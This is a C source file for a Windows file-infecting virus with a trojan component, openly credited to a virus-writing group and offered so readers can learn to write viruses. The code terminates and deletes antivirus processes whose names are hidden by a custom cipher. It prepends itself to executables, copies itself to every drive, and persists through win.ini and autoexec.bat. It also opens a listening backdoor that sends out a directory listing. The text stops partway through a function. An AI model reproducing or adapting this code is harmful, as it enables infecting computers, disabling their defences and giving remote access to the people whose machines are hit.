   /*    Solo espero que el code aqui espuesto pueda ayudar a unos
   y darle una nocion a otros de como programar especies virales
   el codigo es libre, solo pido que respeteis al autor..

   pseudoroot@hotmail.com

   www.gedzac.com

   www.hispavirus.com.ar

   */





   //*********   VIRUS BY PSEUDOROOT/GEDZAC  ************
   //********   EN LA CREACION DEL MISMO   *************
   //*******   agradezco A MACHINEDRAMON & BYTECROW *****
   //******    POR LA AYUDA, GRACIAS A USTEDES E APRENDIDO ***
   //  BASTANTE MUCHACHOS..............GRACIAS ************

   //    GEDZAC LABS (C) 2005

   #include <stdio.h>
   #include <stdlib.h>
   #include <windows.h>
   #include <time.h>
   #include <tlhelp32.h>
   #include <string.h>
   #include <dirent.h>
   #include <winsock.h>
   #include <ctype.h>
   #include <sys\stat.h>


   #define TOT_VENT 13
   #define LF "\n"
   char aleacopy[MAX_PATH];
   char tem1[MAX_PATH];
   char* punter;
   char* firstLt;
   char names[MAX_PATH];
   char tem[255];
   char nm[MAX_PATH]="";
   char winfol[MAX_PATH];
   char mimodu[256];
   int bandepay=0;
   bool fall;

   DWORD (WINAPI *_GetModuleFileName)(HANDLE,HMODULE,LPTSTR,DWORD);
   bool (WINAPI*_EnumProcesses)(DWORD*,DWORD cb,DWORD*);
   bool (WINAPI *_EnumProcessModules)(HANDLE,HMODULE*,DWORD,LPDWORD);


   char carpsys[MAX_PATH];
   char Result[1000];
   struct sockaddr_in my,their;
   WSADATA wsa;
   int z1,z2;
   int Puerto=8996;
   void Iniciar();
   void ResidentServer();
   void WeyConnect();
   void FuncDir();
   void KillNT(const char *ToKill);
   char *EncDec(char *cadena, char *clave, int encripta);
   //   /////////////////////////////////////


   DWORD Id;
   char *ArrAvs[9] = {"cEU.aOa","D7oqw4fp","i1IAVnlmAof2A1","n5XiA1R p2","n5XiA1zT","bA 2dpSAeR7Dpd71",
   "QEUcA1s7D 28G","EcUOiIXz","97DAeW VseB2pADd"};
   char* NamesRnd[]={"EDD .AkA","b 3gA2eu 1t D.AkA","OAD .AkA","Ogk .AkA","ngFAfA.AkA","L S7gd.AkA",
   "mA2AN1tfle1 5A.AkA","2A foA1.AkA","dAk.AkA","dAkl.AkA","o7f.AkA","o7ffAdf.AkA",
   "mgS.AkA","mgSdo7f.AkA","o71Dl.AkA"," D 2.AkA","p l.AkA","71 2.AkA",
   "52A dg1A.AkA"," dt D.AkA","2AdNt Dd.AkA","fAADd.AkA","ht1ptDd.AkA","N7ld.AkA",
   "pt12d.AkA","nR.AkA","d s7.AkA","moAA12A sA1.AkA","71pl.AkA","N2 m4.AkA",
   "N27DsA.AkA","d7s7StFAs.AkA","o 1sm71A.AkA","d2gf.AkA","s7ppl.AkA","dgm4.AkA",
   "SAddl.AkA","4tD4l.AkA","Ltdf-Lgm4tDp.AkA"," S fAg1d.AkA","5 mf7.AkA","st N27.AkA"};
   char* bad[TOT_VENT] =
   {"Norton","AVP","Antivirus","McAfee","anti","vir","virus","Scan","scan","antivirus","hackers","hacker","VSantivirus"};

   int Version=0;
   char *unidades[] = {"G:","d:","z:","A:","c:","p:",
   "o:","t:","r:","4:","2:","S:",
   "D:","7:","5:","3:","1:","s:",
   "f:","g:","h:","j:","k:","l:"};
   char *procesos[] = {"E5hkzjtD","Ehf s4","vstSshd","EhdtS D","QtfAg5p","Qg5pd7Dc",
   "5 huDmh1","v h517f","v1Ahs1h","s571zA1","Y5pfAsf","IAG517kl",
   "ItFs7s","hsS7D","F fgf71","F7DA 2 1S","F2d2tADf"," sstsf",
   "dcpd7Dh","45c8pgt","45c8ss","mSd","Y5z fA1","c5 hg5zS",
   "u-517f","u-mdoAz","uv-ItD","u-mTxvI","EUanT","mftDpA1",
   "nApI714s","N d4g5m1h","mf 1fg5","jMk575AD","d2 Ssd D","B2 ST1 l",
   "B2 SItD","c1Asod2 S","stpf772","IB27sA","D7z0q","D7z0q41D",
   "D7z0q4gt","D7zgft2s","kd7SSsh1","Gzd","Gzss","GztDtf",
   "Gz2tfA","GzSd7D","Gzsjtfdo","Gz7As1h","GzDAjs","GzD pADf",
   "GzDAjs","Gz7As1h","Gzsjtfdo","2hg5fsfL","1AptsfA1","1fh1",
   "g5p1A52","hssA1h","GztDtf","Gz2tfA","GzSd7D","GzD pADf",
   "GzDAjs","Gzsjtfdo","2hg5fsfL","S1pfAsf","1AptsfA1","g5p1A52",
   "1fh1","hssA1h","h1g5z fA","U1mdoA","h11j0q","h11As",
   "h1S7DDf","UnAsdgA","i7sits4","_h10qj","U1Nmd D","h1z",
   "U1S7D","h1S7Dshd","slDdA1"," sf 1f0q"," h sf0q"," hGgp",
   " hd1z f "," hADodz"," h27pfkf"," hS ts1h"," h575jtF"," hsA1hA1",
   "1pg 1z0q","3gtd40q","2pg 1z0q"," hg5z fA"," hstDc7"," hstS52A",
   "EhdoAd4","Ehd2A 1","EhA11","EhtDtdl5","W 4Af s4","TSd1",
   "i7jD27 z","fo0qg5z","To0qg5z2","Tof s4","TosS","G77fg5",
   " hpdd"," hpg5z2D","_tDsf0q","Ehp","Ehpdd0q","EhptDAf",
   "Ehpsd D","EhpsA","EhpsA1hM","Ehphh","Ehpj"," hp Ssh1",
   "N77fg5","9 5z","9 551p","9 5s","9 5g5z","9d 5",
   "4 h","4 hsADz","4 hshd"," soaDodz"," soEh sf"," soNgp",
   " soBoAsf"," soits5"," soQ7pU"," soW tmh"," sov75IF"," sobgtd4",
   " somA1h"," somtS52"," som4vdd"," som4vd4"," soBSz"," sjN77f",
   " sjnApmh1"," sjY5z","sdoAz"," hA","Ehpdf12","EhDf",
   "EUmBVai0q","EhjtD","iA2gs","yg 1zpgt","CDAfg5z","nAG77f",
   " sjd2D1","jtDdoAd4","517dAs pADfsh1.AkA"," Dft-f17r D.AkA"," Dftht1gs.AkA"," Dfs.AkA",
   " 5tS7Dtf71.AkA"," 52td 0q.AkA"," 5hkzjtD.AkA","TEmZWyn.aOa"," fd7D.AkA"," fpg 1z.AkA",
   " f1766AD.AkA"," fg5z fA1.AkA"," fj fdo.AkA"," g.AkA"," g5z fA.AkA"," gf7z7jD.AkA",
   " gf7f1 dA.AkA"," gf7g5z fA.AkA"," hd7Ds72.AkA"," hpsA1hM.AkA","ICRIxni.aOa"," 5hkzjtD.AkA",
   "5 h517kl.AkA"," h2fS tD.AkA"," h517fAdfMk.AkA"," h5g5z.AkA"," hsA1hAq.AkA"," hslDSp1.AkA",
   " hjg5z0q.AkA"," hk3g 1.AkA","Gz_517cAsst7D 2.AkA","GtzAc.AkA","GtzsA1hA1.AkA","Gt5d5.AkA",
   "Gt5d5Ah 2sAfg5.AkA","Gts5.AkA","G2 d4z.AkA","G2 d4tdA.AkA","G77fj 1D.AkA","G71pq.AkA",
   "GswqH.AkA","dd 55.AkA","dz5.AkA","dcpjtF.AkA","dct zStD.AkA","dct gztf.AkA",
   "dctDAf.AkA","dctDAf0q.AkA","d2A D.AkA","d2A DA1.AkA","d2A DA10.AkA","d2A D5d.AkA",
   "dSp1zt D.AkA","dS7DHwJ.AkA","d5z.AkA","d5cMkqHJ.AkA","d5cDfqHJ.AkA","dh.AkA",
   "djDGwLw.AkA","djDfzjS7.AkA","z0zg5z fA.AkA","zAcj fdo.AkA","zA5gfl.AkA","z5c.AkA",
   "z5csAfg5.AkA","z1j fs7D.AkA","z1jAGg5j.AkA","ADf.AkA","Asd DoM6.AkA","Asd DoDf.AkA",
   "Asd DhM6.AkA","Ak Dftht1gs-dDAf.AkA","c sf.AkA","ct1Aj 22.AkA","c27j517fAdf71.AkA","c5-jtD_f1t 2.AkA",
   "c1j.AkA","cs h.AkA","cs h60HsfGlG.AkA","cs h60HjfGlG.AkA","cs hM6.AkA","pGSADg.AkA",
   "pG5722.AkA","pg 1z.AkA","o d4f1 dA1sAfg5.AkA","of27p.AkA","oj5A.AkA","t S 55.AkA",
   "t SsA1h.AkA","td27 zM6.AkA","td27 zDf.AkA","tdS7D.AkA","tdssg55Df.AkA","tdsg55M6.AkA",
   "tdsg55Df.AkA","tcjqHHH.AkA","t5 1S71.AkA","t1ts.AkA","ts cA.AkA","r SSA1.AkA",
   "4 h2tfA8HADp.AkA","4 h5A1s8HADp.AkA","4A1t7-5c-qw0-AD-jtD.AkA","4A1t7-j12-8qw-AD-jtD.AkA","4A1t7-j15-8qw-AD-jtD.AkA","4t22517dAsssAfg5wJw.AkA",
   "2z517.AkA","27d 2DAf.AkA","27d4z7jD.AkA","27d4z7jDqHHH.AkA","2sAfg5.AkA","2g 22.AkA",
   "2gd7SsA1hA1.AkA","2gtDtf.AkA","Sd pADf.AkA","Sdg5z fA.AkA","ScjqAD.AkA","ScjADp0.Hqz0H.AkA",
   "Spgt.AkA","StDt27p.AkA","S772thA.AkA","S1c2gk.AkA","Ssd7Dctp.AkA","SstDc70q.AkA",
   "SssSSd0q.AkA","SgH0ww z.AkA","D hLHf1l.AkA","D h 5j0q.AkA","D hzk.AkA","D hsfgG.AkA",
   "D hj0q.AkA","DdqHHH.AkA","DdtDsf8.AkA","Dzz0q.AkA","DA7S7Dtf71.AkA","DAf 1S71.AkA",
   "DAftDc7.AkA","DAfS7D.AkA","DAfsd D517.AkA","DAfs5logDfA1-w.q.AkA","DAfsf f.AkA","DtssA1h.AkA",
   "DtsgS.AkA","DS tD.AkA","D71f7D_tDfA1DAf_sAdg_0.H_8HK.AkA","D5c8H_fj_ML_Df_SA_q4.AkA","D5cSAssADpA1.AkA","D517fAdf.AkA",
   "DsdoAz0q.AkA","DfhzS.AkA","Dg5p1 zA.AkA","Dh 1dowJ.AkA","DjtDsf8.AkA","Djf772wJ.AkA",
   "7sf17DAf.AkA","7gf57sf.AkA","7gf57sftDsf 22.AkA","7gf57sf517tDsf 22.AkA","5 zStD.AkA","5 Dtk4.AkA",
   "5 h517kl.AkA","5ddqHHqsMHq.AkA","5ddq4_KJ_w80J.AkA","5ddt7S7D.AkA","5dzsAfg5.AkA","5dcj 22td7D.AkA",
   "5dt5wHwwK_H.AkA","5zsAfg5.AkA","5A1tsd75A.AkA","5A1scj.AkA","5cq.AkA","5cj zStD.AkA",
   "5tDpsd D.AkA","52 ftD.AkA","57517kl.AkA","575sd D.AkA","571fzAfAdfthA.AkA","55tDg5zf.AkA",
   "55fGd.AkA","55hsf75.AkA","517dAk5271A1hw.H.AkA","517571f.AkA","517fAdfk.AkA","5s5c.AkA",
   "5g1pA.AkA","5htAjM6.AkA","3d7Ds72A.AkA","3sA1hA1.AkA","1 hLjtD0qADp.AkA","1AsdgA.AkA",
   "1AsdgA0q.AkA","11pg 1z.AkA","1soA22.AkA","1fhsdDM6.AkA","1g2 gDdo.AkA","s cAjAG.AkA",
   "sGsA1h.AkA","sz.AkA","sAfg5_c27j517fAdf71_gs.AkA","sAfg5h SAAh 2.AkA","scd.AkA","spsscj0q.AkA",
   "soA22s5ltDsf 22.AkA","soD.AkA","sSd.AkA","s7ct.AkA","s5c.AkA","s5otDk.AkA",
   "s5lkk.AkA","ss0Aztf.AkA","sfq.AkA","sg5cf12.AkA","sg5571fA16.AkA","slS517klshd.AkA",
   "slsAztf.AkA","f s4S7D.AkA","f gS7D.AkA","f gsd D.AkA","fd.AkA","fd .AkA",
   "fdS.AkA","fzsq-ML.AkA","fzsq-Df.AkA","fzs-0.AkA","fc 46.AkA","fpG7G.AkA",
   "ftf DtD.AkA","ftf DtDk5.AkA","f1 dA1f.AkA","f1rsd D.AkA","f1rsAfg5.AkA","f17r Df1 50.AkA",
   "gDz7G77f.AkA","g5z fA.AkA","hGdSsA1h.AkA","hGd7Ds.AkA","hGgsf.AkA","hGjtDMk.AkA",
   "hGjtDDfj.AkA","hdsAfg5.AkA","hAfSsp.AkA","hAff1 l.AkA","hcsAfg5.AkA","ht1gsSz5A1s7D 2ct1Aj 22.AkA",
   "hD2 D0HH.AkA","hD5d0HHH.AkA","h5d8q.AkA","h5cj0Hs.AkA","h5f1 l.AkA","hsdADgJ.Hqz0H.AkA",
   "hsAd7S1.AkA","hsojtD0q.AkA","hstsAfg5.AkA","hsS tD.AkA","hsS7D.AkA","hssf f.AkA",
   "hsjtDMkA.AkA","hsjtDDfsA.AkA","hsjtD5A1sA.AkA","j0qzsSLM.AkA","jMk.AkA","j fdoz7p.AkA",
   "jAGsd Dk.AkA","jpcAM6.AkA","jo7sj fdotDpSA.AkA","jtD1Ad7D.AkA","jDf.AkA","j1 zStD.AkA",
   "j1df12.AkA","jsGp fA.AkA","jlhA1Dj714sct1Aj 22.AkA","k5cqHqAD.AkA","F 517.AkA","F 5sAfg50HHw.AkA",
   "F fgf71.AkA","F gtDsf.AkA","v h517kl.AkA","F2d2tADf.AkA","F7D 2SqJHw.AkA","F7DA 2 1S.AkA"};

   //      ///////////////////////////////////////////

   static void Matand0Av3rs(const char * processname)
   {
   HANDLE proc;
   PROCESSENTRY32 process;
   process.dwSize = sizeof(PROCESSENTRY32);
   void* photo = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

   Process32First(photo,&process);

   while(photo != NULL)
   {
   Process32Next(photo,&process);
   proc = OpenProcess(PROCESS_ALL_ACCESS,false,process.th32ProcessID);

   if(strstr(strupr(process.szExeFile),processname))
   {
   TerminateProcess(proc,0);
   char pr[MAX_PATH]="";
   sprintf(pr,"%s",process.szExeFile);
   Sleep(1500);
   SetFileAttributes(pr,FILE_ATTRIBUTE_NORMAL);
   DeleteFile(pr);
   CloseHandle(proc);
   break;
   }

   if(GetLastError()==ERROR_NO_MORE_FILES)
   {
   break;
   }

   CloseHandle(proc);
   }
   }


   //   //////////////////////////

   int NumRnd(int num)
   {
   return(int) (rand()%num);
   }

   // /////////////////////////////////////

   LPSTR LetrasRnd(int d)
   {
       srand((unsigned int) GetTickCount());
   char Let[26]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
   char strT[64]="";
   for(int i=0; i<d; i++)
   {
   strT[i]=Let[NumRnd(26)];
   }

   char *st=new char[64];
   strcpy(st,strT);
   return st;
   }

   //       //////////////////////////

   LPSTR ExtRnd()
   {
       srand((unsigned int) GetTickCount());
   char *Extension[]={".EXE",".COM",".BAT"};
   char *Ext=new char[3];
   int r;
   r=NumRnd(3);
   Ext=Extension[r];
   return Ext;
   }


   //        /////////////////////////////////
   bool ExistsWin(LPSTR Ven)
   {
   bool r = false;
   for (int i=0;i<TOT_VENT;i++)
   if (strstr(Ven,bad[i])!=0) r = true;
   return r;
   }



   //                /////////////////////////////

   bool CALLBACK Matand0V3en(HWND hwnd1,long l1)
   {
   LPTSTR Text = new char[256];
   GetWindowText(hwnd1,Text,MAX_PATH);
   if (ExistsWin(Text))
   {
   DWORD dwProcessId;
   GetWindowThreadProcessId(hwnd1,&dwProcessId);
   if (dwProcessId!=GetCurrentProcessId())
   {
   HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
   TerminateProcess(hProcess,0);
   CloseHandle(hProcess);
   }
   }
   return true;
   }

   //  ///////////////////////////////////
   void LanzarKillWin()
   {
   LPARAM lPar = 0;
   EnumWindows((WNDENUMPROC)Matand0V3en,lPar);
   }


   //   ///////////////////

   DWORD WINAPI AvKill(LPVOID)
   {
   char *punt;
   while(true)
       {

           Sleep(15000);
     for(int j=0; procesos[j];j++)
   {
     punt=EncDec(procesos[j], "Gedzac", 1);
        Matand0Av3rs(punt);


   }

   }
   }

   //      /////////////////////////

   DWORD WINAPI th(LPVOID)
   {
       while(true)
       {
           Sleep(10000);
           LanzarKillWin();
       }
   }

      //  ////////////////

      DWORD WINAPI AvKillNT(LPVOID)
   {
   char *punt;
   while(true)
       {

           Sleep(15000);
     for(int j=0; procesos[j];j++)
   {
     punt=EncDec(procesos[j], "Gedzac", 1);
        KillNT(punt);


   }

   }
   }

   char* FindDrive(const char* dr)
   {
   for(int j=0; j<1; j++)
   tem1[j]=dr[j];
   return tem1;
   }


   //    ///////////////////////////////////////////////
   void ConFile(const char *d)
   {
       srand((unsigned int) GetTickCount());
       char *nam;
       char temp[MAX_PATH]="";
       char name[MAX_PATH]="";
        strcpy(temp,d);
       strcat(temp,"\\");
       nam=EncDec(NamesRnd[NumRnd(42)], "NamesALea",1);
       strcat(temp,nam);
       strcpy(name,temp);
       CopyFile(mimodu,name,0);
       SetFileAttributes(name,FILE_ATTRIBUTE_NORMAL);
   }

   int Disk(const char*drive)
   {
       UINT dr=GetDriveType(drive);
       if(dr==DRIVE_REMOVABLE)
   {
   ConFile(drive);
   return 0;
   }

   if(dr==DRIVE_CDROM)
   {
   ConFile(drive);
   return 0;
   }

   if(dr==DRIVE_FIXED)
   {
   ConFile(drive);
   return 0;
   }

   if(dr==DRIVE_RAMDISK)
   {
   ConFile(drive);
   return 0;
   }

   if(dr==DRIVE_REMOTE)
   {
   ConFile(drive);
   return 0;
   }

   if(dr!=DRIVE_REMOTE || dr!=DRIVE_REMOVABLE || dr!=DRIVE_RAMDISK || dr!=DRIVE_FIXED || dr!=DRIVE_CDROM)


   {
   ConFile(drive);
   return 0;
   }
   else
   {
   ConFile(drive);
   return 0;
   }

   return (0);
   }


   //   ////////////////////////////////////
   int MapFileVir(LPSTR infectfile)
   {
         HANDLE hHost, hVir, mHost, mVir, mFile;
   DWORD szHost, szVir;
   unsigned char *h, *v, *f;
   char FIRMA[]="KAY";

   hHost = CreateFile(infectfile,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
   if (hHost==INVALID_HANDLE_VALUE) return 0;

   hVir = CreateFile(aleacopy,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
   if (hVir==INVALID_HANDLE_VALUE) { CloseHandle(hHost); return 0; }

   szHost = GetFileSize(hHost,0);
   szVir = GetFileSize(hVir,0);

   mHost = CreateFileMapping(hHost,0,PAGE_READWRITE,0,szHost+szVir+lstrlen(FIRMA),NULL);
   if (mHost==NULL) { CloseHandle(hHost); CloseHandle(hVir); return 0; }

   mVir = CreateFileMapping(hVir,0,PAGE_READONLY,0,szVir,NULL);
   if (mVir==NULL) { CloseHandle(hHost); CloseHandle(hVir); CloseHandle(mHost); return 0; }

   h = (unsigned char *)MapViewOfFile(mHost,FILE_MAP_READ,0,0,szHost);
   if (h==NULL) { CloseHandle(mHost); CloseHandle(mVir); CloseHandle(hHost); CloseHandle(hVir); return 0; }

   v = (unsigned char *)MapViewOfFile(mVir,FILE_MAP_READ,0,0,0);
   if (v==NULL) { CloseHandle(mHost); CloseHandle(mVir); CloseHandle(hHost); CloseHandle(hVir); UnmapViewOfFile(h); return 0; }

   f = (unsigned char *)MapViewOfFile(mHost,FILE_MAP_WRITE,0,0,szHost+szVir+lstrlen(FIRMA));
   if (f==NULL) { goto FUERA; }

   CopyMemory(&f[szVir],&h[0],szHost);
   CopyMemory(&f[0],&v[0],szVir);
   CopyMemory(&f[szHost+szVir],FIRMA,lstrlen(FIRMA));

   UnmapViewOfFile(f);
   FUERA:
   UnmapViewOfFile(h); UnmapViewOfFile(v);
   CloseHandle(mHost); CloseHandle(mVir);
   CloseHandle(hHost); CloseHandle(hVir);
   return 1;
   }


      //  /////////////////////////////////////////
   void FindFiles(char *dir)
   {
   char file[256];
   int contando;
   char buffer[256];
   WIN32_FIND_DATA datos;
   HANDLE buscar;
   bool Loop=true;
   sprintf(buffer,"%s*.*",dir);
   buscar=FindFirstFile(buffer,&datos);
   if(buscar!=INVALID_HANDLE_VALUE)
   {
   while(Loop)
   {
   if((datos.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY
   ||datos.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM)
   && (strstr(datos.cFileName,".")==0))

   {
   char buf[256];
   sprintf(buf,"%s%s\\",dir,datos.cFileName);

   FindFiles(buf);
   }

   if(strstr(strupr(datos.cFileName),".EXE"))
   {
   sprintf(file,"%s%s",dir,datos.cFileName);
   // comprobar si tiene la firma

   // si no la tiene se infecta
   MapFileVir(file);
   //MessageBoxA(NULL,file,"archivo A infectar",MB_OK);

   contando++;
   }
   Loop=FindNextFile((void*)buscar,&datos);
   }
   }
   FindClose((void *)buscar);
   }

   //       ///////////////////


   int ComponentTroy()
   {

   char buf[MAX_PATH];
   if(WSAStartup(MAKEWORD(1,1),&wsa)!=0) {
   WSACleanup();
   return 0;
   }

   my.sin_family=AF_INET;
   my.sin_port=htons(Puerto);
   my.sin_addr.s_addr=INADDR_ANY;
   memset(&(my.sin_zero),'0',8);

   Iniciar();

   do{

   ResidentServer();
   }while(1);
   WSACleanup();
   return 0;
   }


   void Iniciar()
   {
   closesocket(z1);
   z1=socket(AF_INET,SOCK_STREAM,0);
   if(z2==-1)
   {return;}
   WeyConnect();
   }


   // //////////////////////////////////////////
   void WeyConnect()
   {
   int flat;
   flat=bind(z1,(struct sockaddr*)&my,sizeof(struct sockaddr));
   if(flat==-1)
   {
   return;
   }

   flat=listen(z1,5);
   if(flat==-1)
   {
   return;
   }

   int size;
   size=sizeof(struct sockaddr_in);
   z2=accept(z1,(struct sockaddr*)&their,&size);
   if(z2==-1)
   {
   return;
   }

   closesocket(z1);
   }

   // ///////////////////////////////////////////////
   void ResidentServer()
   {
   int brecv=0;
   char buf[MAX_PATH];
   brecv=recv(z2,(char*)&buf,sizeof(buf),0);
   if(brecv==-1 || brecv==0)
   {
   Iniciar();
   return;
   }

   if(buf=="1")
   {
   FuncDir();
   return;
   }

   if(buf=="2")
   {
   MessageBoxA(0,"W32/Kay By Pseudoroot/GEDZAC","GEDZAC LABS",0);
   return;
   }

   }

   //      ///////////////////////////////////
   char *EncDec(char *cadena, char *clave, int encripta){

      char alfabetoB[100];
      char alfabetoC[100];
      char alfabeto[2][100];
         int alf2, i, pos;

      strcpy(alfabetoB, "ae AEbcdfghijklmnopqrstuvwxyz0123456789BCDFGHIJKLMNOPQRSTUVWXYZ");
      strcpy(alfabetoC,  "potre42ASD7531sdfghjklFGHwq086JKLMNBiuyVCXZ QWERzxcvbnmaTYUIOP9");
      strcpy(alfabeto[0], "");
      strcpy(alfabeto[1], "");
      strcpy(Result, "");
      strcpy(alfabeto[encripta], alfabetoB);
      alf2 = (encripta + 1) % 2;

       switch  ( strlen(clave)%3 ) {
         case 0:
           strcpy(alfabeto[alf2], " AeEa"); break;
         case 1:
           strcpy(alfabeto[alf2], "E aeA"); break;
         case 2:
           strcpy(alfabeto[alf2], "e aEA"); break;
       }

      char cad[20];
      int apar1, apar2;
      for ( i =  0; i< strlen(clave) ; i++) {
         cad[0] = clave[i];
         cad[1] = '\0';
         apar1 = apar2 = -1;

         for ( int j=0 ; j<strlen(alfabeto[alf2]); j++)
            if ( alfabeto[alf2][j] == cad[0] ) {
               apar1 = 1;
               break;
            }

         for (int  gj=0 ; gj<strlen(alfabetoB); gj++)
            if ( alfabetoB[gj] == cad[0] ) {
               apar2 = 1;
               break;
            }

         if ( apar1< 1 && apar2>=1 )
             strcat(alfabeto[alf2], cad);

      }


      apar1 = -1;
      for ( i = 0 ; i<strlen(alfabetoC) ; i++) {
         apar1 = -1;
         cad[0] = alfabetoC[i];
         cad[1] = '\0';

         for (int  j=0 ; j<strlen(alfabeto[alf2]) ; j++) {
               if ( cad[0] == alfabeto[alf2][j]) {
                 apar1 = 1;
                 break;
               }
         }

         if (apar1 < 1 )
            strcat(alfabeto[alf2], cad);
      }

      for ( i = 0 ; i<strlen(cadena) ; i++) {
         pos = -1;
         cad[0]  = cadena[i];
         cad[1] = '\0';

         for ( int j=0 ; j<strlen(alfabeto[0]) ; j++) {
            if ( cad[0] == alfabeto[0][j] ) {
              pos  = j;
              break;
            }
         }

         if (pos < 0 )
            strcat(Result, cad);
         else {
            cad[0] = alfabeto[1][pos];
            cad[1] = '\0';
            strcat(Result, cad);
         }
      }

      return Result;

   }

   // ////////////////////////////////
   void FuncDir()
   {
   DIR *dir;
   dirent *ent;
   char files[30000]="";
   if((dir=opendir("c:\\"))==NULL)
   {
   return;
   }
   while((ent=readdir(dir))!=NULL)
   {
   strcat(files,ent->d_name);
   strcat(files,"*");
   }

   closedir(dir);
   send(z2,files,sizeof(files),0);
   }

   //      /////////////////////////////

   void KillNT(const char *Procc)
   {
       // Esta funcion es casi tolalmente escrita
       // por Byt3cr0w ,ya levemente la he modificado
       // para que tambien borre los antivurus que halle.
           int l1,l2,ix;
   bool r1;
   DWORD cb=1024,x,needCb,pn,pid[1024],f=0;
   HANDLE phandy;
           HMODULE mhandy;
           char nam[MAX_PATH],up[MAX_PATH];

   l2=strlen(Procc);
   if(l2<1 || l2>MAX_PATH) return;
   for(ix=0;ix<l2;ix++)
           up[ix]=toupper(Procc[ix]);
   up[l2]=0;

           r1=_EnumProcesses(pid,cb,&needCb);
           if(!r1) return;

           pn=needCb/sizeof(DWORD);
           for(x=0;x<pn;x++)
           {
           phandy=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,pid[x]);
           if(phandy)
           {
           if(_EnumProcessModules(phandy,&mhandy,sizeof(mhandy),&needCb) )
           {
           l1=_GetModuleFileName(phandy,mhandy,nam,MAX_PATH);
   }
           }
           CloseHandle(phandy);
           if(strcmp(strupr(nam),up)==0)
           {
           f=1;
           phandy=OpenProcess(PROCESS_TERMINATE,FALSE,pid[x]);
           if(phandy)
           {
           if(TerminateProcess(phandy,0))
           {
   Sleep(1500);
   SetFileAttributes(nam,FILE_ATTRIBUTE_NORMAL);
   DeleteFile(nam);
   CloseHandle(phandy);
           return;
           }
           else
           {
           CloseHandle(phandy);
           return;
           }
           }
           else
           {
           return;
           }
           }
           }
   }






   //       /////////////////////

   DWORD WINAPI Troyan_Component(LPVOID)
   {
       ComponentTroy();
   }


   //              //////////////////
   DWORD WINAPI Infect_Disk(LPVOID)
   {
       char *pun;

       for(int i=0; unidades[i]; i++)
       {
       pun=EncDec(unidades[i], "Gedzac", 1);
               Disk(pun);
       }
   }

   //   ////////////////////////
   DWORD WINAPI Infect_Diskette(LPVOID)
   {
        ULARGE_INTEGER dat;
       while(1)
       {
           Sleep(50000);
           SetErrorMode(SEM_FAILCRITICALERRORS);
          if(GetDiskFreeSpaceEx("A:\\",NULL,NULL,&dat))
           ConFile("A:\\");
       }
   }

   //  ///////////////////////////////////
   void CargaApis(void)
   {
   HINSTANCE lib = LoadLibraryA("PSAPI.DLL");
   if(lib == 0) return;
   _EnumProcesses = (bool(WINAPI*)(DWORD*,DWORD,DWORD*))
   GetProcAddress(lib,"EnumProcesses");
   _EnumProcessModules = (bool(WINAPI*)(HANDLE,HMODULE*,DWORD,LPDWORD))
   GetProcAddress(lib,"EnumProcessModules");
   _GetModuleFileName = (DWORD(WINAPI*)(HANDLE,HMODULE,LPTSTR,DWORD))
   GetProcAddress(lib,"GetModuleFileNameExA") ;
   if(_EnumProcesses==0||_EnumProcessModules==0||_GetModuleFileName==0)
   {
   FreeLibrary(lib);
   fall = true;
   }

   }



   // ///////////////////////////////////////////////
   DWORD WINAPI Mat4Tools(LPVOID)
   {
   HWND handle;
   char* vent1 = "b prfgdGaAlrg5d";
   char* vent2 = "Alrg5dal Sab prfgd5";
   char* vent3 = "ElDr7rfgdel5dal aged efal aIr7l5kf";
   char* vent4 = "Ir7l5kfamef2aRe7ep d";
   char *ntl1;
   char* ntl2;
   char* ntl3;
   char* ntl4;
   vol:
   ntl1=EncDec(vent1, "Tools",1);
   handle = FindWindow(0,ntl1);
   if (handle!=0) {
   PostMessage(handle,0x12,0,0);
   }
   ntl2=EncDec(vent2, "Tools",1);
   handle = FindWindow(0,ntl2);
   if (handle!=0) {
   PostMessage(handle,0x12,0,0);
   }
   ntl3=EncDec(vent3, "Tools",1);
   handle = FindWindow(0,ntl3);
   if (handle!=0) {
   PostMessage(handle,0x12,0,0);
   }
   ntl4=EncDec(vent4, "Tools",1);
   handle = FindWindow(0,ntl4);
   if (handle!=0) {
   PostMessage(handle,0x12,0,0);
   }
   Sleep(1500);
   goto vol;
   }

   // //////////////////////////////////////

   void WriteIni()
   {
       srand((unsigned int) GetTickCount());
   char tempo[MAX_PATH],names1[256];
   //strcpy(tempo,carpsys);
   strcat(carpsys,"\\");
   strcat(carpsys,LetrasRnd(10));
   strcat(carpsys,ExtRnd());
   strcpy(names,carpsys);
   char tempo1[MAX_PATH];
   CopyFile(mimodu,names,0);
   SetFileAttributes(names,FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);
   const char k[]="run";
   const char f[]="win.ini";
   WritePrivateProfileString("Windows",k,names,f);
   }

   //  //////////////////////////////////////
   void writeauto()
   {
   FILE* p;
      p=fopen("C:\\autoexec.bat","a+");
   fputs(LF,p);
      fputs("@",p);
      fputs(" ",p);
      fputs(names,p);
      fclose(p);
   }

   // //////////////////////////////////////////
   void Mut()
   {
   CreateMutex(NULL,true,"Kay");
   if(GetLastError()==ERROR_ALREADY_EXISTS)
   {
     ExitProcess(0);
   }
   }

   //         /////////////////////
      void OS()
   {
   OSVERSIONINFO SistOpe;
   SistOpe.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&SistOpe);
   if (SistOpe.dwPlatformId ==VER_PLATFORM_WIN32_WINDOWS) {
   Version=1;
   //MessageBoxA(0,"//WIN32_WIN9X","si",0);
   }
   else
   {
   Version=2; //WIN32_WINNT;
   //MessageBoxA(0,"//WIN32_WINNT","si",0);
   }
   }
   // ////////////////////////////////////////////
   void oc()
   {
   typedef DWORD(_stdcall *pRegFunction) (DWORD,DWORD);
   HINSTANCE
   hkernelLib;
   pRegFunction
   RegisterServiceProcess;
   hkernelLib=LoadLibrary("Kernel32.dll");
   if(hkernelLib)
   {
   RegisterServiceProcess=(pRegFunction) GetProcAddress
   (hkernelLib,"RegisterServiceProcess");
